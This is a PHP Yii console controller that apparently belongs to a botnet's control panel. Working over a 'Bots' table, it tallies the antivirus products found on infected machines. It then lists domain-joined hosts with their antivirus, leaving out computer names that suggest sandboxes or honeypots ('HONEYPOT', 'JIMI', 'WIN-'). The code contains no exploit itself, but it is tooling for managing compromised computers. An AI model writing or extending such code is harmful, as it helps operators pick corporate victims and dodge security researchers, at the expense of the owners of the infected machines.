<?php

namespace console\controllers;

use yii\console\Controller;
use Yii;
use common\models\Bots;
use yii\db\Expression;
use yii\validators\IpValidator;
use yii\helpers\ArrayHelper;
use common\models\Proxylog;

class AvirController extends Controller
{
    public function actionAvcount()
    {
        $avp = [];
        $avc = [];
        $h = [];
        $sortavp = [];
    	$b = Bots::find(['not',['av' => null]])->all();
        foreach ($b as $key => $value) {
            $a = json_decode($value['av']);
            if(isset($a[0])){
                $aa = $a[0];
                if(isset($aa[0])){
                    $j = array_search($aa[0], $avp);
                    if($j===false){
                        array_push($avc, 1);
                        array_push($avp, $aa[0]);
                    }else{
                        $avc[$j]++;
                    }
                    
                }
            }
            
        }
        for($i=0;$i<count($avp);$i++){
            $sortavp[$avp[$i]]= $avc[$i];

        }
        arsort($sortavp);
        print_r($sortavp);

        exit();
    }

    public function actionDomains()
    {

        $a = ['WIN-','PC-','-PC','WINDOWS','JIMI','HONEYPOT'];
        $avp = [];
        $avc = [];

        $b = Bots::find(['not',['cname' => null]])->all();
        foreach ($b as $key => $value) {
            $j = array_search($value['cname'], $avp);
            if($j===false){
                array_push($avc, 1);
                array_push($avp, $value['cname']);
            }else{
                $avc[$j]++;
            }
            
        }

        for($i=0;$i<count($avp);$i++){
            $sortavp[$avp[$i]]= $avc[$i];

        }

        arsort($sortavp);
        print_r($sortavp);
        exit();
    }

    public function actionAvdomains()
    {

        $a = ['WIN-','PC-','-PC','WINDOWS','JIMI','HONEYPOT','WORKGROUP'];
        $avp = [];
        $avc = [];
        $avd = [];

        $b = Bots::find(['not',['cname' => null]])->orderBy(['domain' => SORT_ASC,'cname'=>SORT_ASC])->andFilterWhere(['not',['domain' => '']])->all();
        foreach ($b as $key => $value) {
            /*$isa = false;
            foreach ($a as $k => $v) {
                if(strpos($value['cname'], $v)!==false){
                    $isa = true;
                }
            }
            if(!$isa){
                $j = array_search($value['cname'], $avp);
                if($j===false){
                    array_push($avc, 1);
                    array_push($avp, $value['cname']);
                    array_push($avd, $value['domain']);
                }else{
                    $avc[$j]++;
                }
            }*/
            foreach ($a as $k => $v) {
                $isa = false;
                if(strpos(strtoupper($value['cname']), $v)!==false){
                    $isa = true;
                }
                if(strpos(strtoupper($value['domain']), $v)!==false){
                    $isa = true;
                }
                if($value['domain']==''){
                    $isa = true;
                }
            }
            if(!$isa){
                $s = '';
                $s0 = '';
                $avpr = json_decode($value['av']);
                if(isset($avpr)){
                    for($i = 0; $i < count($avpr); $i++){
                        if($i==0){
                            $s0 = str_pad($avpr[$i][0].' '.$avpr[$i][1],25);
                        }else{
                            $s .= str_pad('',50).$avpr[$i][0].' '.$avpr[$i][1].chr(13).chr(10);
                        }
                        
                    }
                    //print_r($s);
                }
                
                print_r(str_pad(substr($value['domain'], 0, 25),25).str_pad($value['cname'],25).$s0.chr(13).chr(10));
                print_r($s);
            }
            
            
        }

        /*for($i=0;$i<count($avp);$i++){
            $sortavp[$avp[$i]]= $avc[$i];

        }

        arsort($sortavp);
        print_r($sortavp);*/
        exit();
    }

}
